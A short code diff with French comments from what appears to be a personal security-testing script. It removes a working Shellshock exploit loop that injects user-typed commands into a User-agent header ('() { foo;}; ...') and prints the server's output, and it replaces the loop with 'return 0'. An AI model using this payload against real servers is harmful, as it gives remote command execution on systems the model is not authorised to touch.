@@ -21,21 +21,8 @@ def toto():
 
 #pris du git  sur shellshock 
 def Scanner(url):
-
-    URL=url
-    print("[+] Attempting Shell_Shock - Make sure to type full path")
-
-    while True:
-        command=raw_input("~$ ")
-        opener=urllib2.build_opener()
-        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
-        try:
-                response=opener.open(URL)
-                for line in response.readlines():
-                        print line.strip()
-        except Exception as e: print e
-        
-
+    
+    return 0 
 #def Base_Docu():
 #   pureFTD // a tester https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc
 
